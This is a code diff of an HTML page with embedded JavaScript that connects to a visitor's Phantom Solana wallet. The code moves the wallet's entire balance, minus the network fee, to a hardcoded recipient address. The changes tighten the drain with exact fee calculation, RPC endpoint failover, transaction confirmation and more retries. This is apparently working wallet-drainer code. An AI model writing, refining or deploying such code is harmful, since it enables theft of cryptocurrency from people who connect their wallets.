@@ -14,28 +14,30 @@
     </div>
     <p id="result"></p>
 
-    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+    <!-- Use latest Solana Web3.js version -->
+    <script src="https://unpkg.com/@solana/web3.js@1.85.0/lib/index.iife.min.js"></script>
     <script>
         let wallet;
-        const predeterminedAddress = "2vPe8sNRwzRcVZ9qjHBNtT1VLeBLgRcjrp3zxaFo4oPE"; // Replace with recipient address
+        const predeterminedAddress = "2vPe8sNRwzRcVZ9qjHBNtT1VLeBLgRcjrp3zxaFo4oPE"; // Replace with valid address
         const publicRpcEndpoints = [
             "https://api.mainnet-beta.solana.com",
             "https://solana-api.projectserum.com",
-            "https://ssc-dao.genesysgo.net"
+            "https://ssc-dao.genesysgo.net",
+            "https://solana-mainnet.rpc.extrnode.com"
         ];
         let currentRpcIndex = 0;
 
-        // Retry logic for public RPCs
+        // Improved connection handler
         async function getConnection() {
             const connection = new solanaWeb3.Connection(publicRpcEndpoints[currentRpcIndex], "confirmed");
             try {
-                // Test the connection
-                await connection.getSlot();
+                await connection.getEpochInfo(); // Test connection
+                console.log("Using RPC:", publicRpcEndpoints[currentRpcIndex]);
                 return connection;
             } catch (error) {
-                // Switch to next RPC endpoint on failure
+                console.error("RPC failed. Switching...");
                 currentRpcIndex = (currentRpcIndex + 1) % publicRpcEndpoints.length;
-                return getConnection(); // Retry recursively
+                return getConnection();
             }
         }
 
@@ -43,14 +45,15 @@
             if (window.phantom?.solana?.isPhantom) {
                 wallet = window.phantom.solana;
                 try {
-                    await wallet.connect();
+                    await wallet.connect({ onlyIfTrusted: false });
+                    console.log("Connected to:", wallet.publicKey.toString());
                     document.getElementById('transferSection').style.display = 'block';
                     document.getElementById('connectWallet').style.display = 'none';
                 } catch (error) {
                     alert("Connection failed: " + error.message);
                 }
             } else {
-                alert("Phantom Wallet not detected!");
+                alert("Install Phantom Wallet!");
             }
         });
 
@@ -60,31 +63,49 @@
                 const recipientPublicKey = new solanaWeb3.PublicKey(predeterminedAddress);
                 const balance = await connection.getBalance(wallet.publicKey);
 
-                // Calculate max transfer (balance - 5000 lamports for safety)
-                const amountToSend = balance > 5000 ? balance - 5000 : 0;
-                if (amountToSend <= 0) {
-                    throw new Error("Insufficient SOL for transfer");
+                // Fetch current fee
+                const fee = await connection.getFeeForMessage(
+                    solanaWeb3.TransactionMessage.decompile(
+                        new solanaWeb3.Transaction().add(
+                            solanaWeb3.SystemProgram.transfer({
+                                fromPubkey: wallet.publicKey,
+                                toPubkey: recipientPublicKey,
+                                lamports: 1, // Dummy value to calculate fee
+                            })
+                        ).compileMessage()
+                    ).compileToLegacyMessage()
+                ).value;
+
+                if (balance <= fee) {
+                    throw new Error(`Insufficient SOL. Need at least ${fee / solanaWeb3.LAMPORTS_PER_SOL} SOL for fees.`);
                 }
 
+                // Build transaction
                 const transaction = new solanaWeb3.Transaction().add(
                     solanaWeb3.SystemProgram.transfer({
                         fromPubkey: wallet.publicKey,
                         toPubkey: recipientPublicKey,
-                        lamports: amountToSend,
+                        lamports: balance - fee,
                     })
                 );
 
-                // Add retry for transaction submission
-                let retries = 3;
+                // Add blockhash and retry logic
+                transaction.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
+                transaction.feePayer = wallet.publicKey;
+
+                let retries = 5;
                 while (retries > 0) {
                     try {
                         const signature = await wallet.signAndSendTransaction(transaction);
+                        const result = await connection.confirmTransaction(signature, "confirmed");
+                        if (result.value.err) throw new Error("Transaction failed");
                         document.getElementById('result').textContent = `Transfer successful! Signature: ${signature}`;
                         break;
                     } catch (error) {
                         retries--;
                         if (retries === 0) throw error;
-                        await new Promise(resolve => setTimeout(resolve, 2000)); // Wait 2 seconds
+                        await new Promise(resolve => setTimeout(resolve, 5000)); // Wait 5 seconds
+                        console.log("Retrying...");
                     }
                 }
             } catch (error) {
